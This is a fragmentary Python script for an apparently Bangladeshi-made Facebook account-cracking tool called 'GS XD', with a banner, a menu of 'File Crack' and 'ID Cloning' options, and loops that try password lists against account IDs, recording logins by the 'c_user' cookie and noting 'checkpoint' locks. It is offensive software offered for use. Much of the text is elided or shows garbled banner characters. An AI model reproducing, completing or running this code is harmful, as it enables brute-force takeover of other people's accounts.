...
y1=('-');y2=('y');y3=(' > ')
ys=y1+y2+y3
print('\033[1;34m install missing modules...\n It will take some seconds...')
...
â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•”â•â•â•â•â•    â•šâ•â•â•â•â–ˆâ–ˆâ•—    â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•

â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•     â•šâ–ˆâ–ˆâ–ˆâ•”â• 

â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â•šâ•â•â•â•â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•”â•â•â•â•      â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— 

â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•—
...
\033[1;92mâ•‘ á—™  Owner    : MD RIYAD                  â•‘

\033[1;92mâ•‘ á—™  Facebook : MD.RIYAD                  â•‘

\033[1;92mâ•‘ á—™  Version  : 0.6                       â•‘

\033[1;92mâ•‘ á—™  Team     : GS POWER                  â•‘ 
...
def menu(): 
	...
	print(logo)
	print('\033[1;37m--------------------------------------------------')
	print('\x1b[1;91mâ§¼ WORKING â§½ :\x1b[1;92m THIS IS PIAD TOOLS DO NOT UES BYPASS ')
	print('\033[1;37m--------------------------------------------------')
	print(' [1] File Crack \n [2] Create file\n [3] Public ID Cloning\n [4] Random Cloning\n [5] Gmail Cloning\n [6] Separate Ids\n [7] Remove Dublicate Lines \n [8] Login Another Cookie\n [9] Contact With Owner\n [0] Exit Menu')
	linex()
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [GS XD á—™] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
...
def rcrack(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [GS XD á—™] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [GS XD-TL] '+ids+' | '+pas)
					else:
